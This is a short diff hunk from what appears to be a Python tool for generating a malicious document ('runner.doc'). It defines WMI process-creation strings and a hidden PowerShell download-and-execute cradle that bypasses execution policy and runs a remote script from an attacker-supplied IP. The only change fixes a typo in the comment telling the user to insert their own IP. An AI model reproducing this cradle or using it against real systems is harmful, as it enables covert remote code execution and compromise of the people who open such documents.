@@ -4,7 +4,7 @@ import random
 filename = "runner.doc"
 winmgmts = "winmgmts:"
 win32_process = "Win32_Process"
-cmd = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.x.x/run.txt'))" # change to yout IP address
+cmd = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.x.x/run.txt'))" # change to your IP address
 
 # Define color codes
 GREEN = '\033[92m'
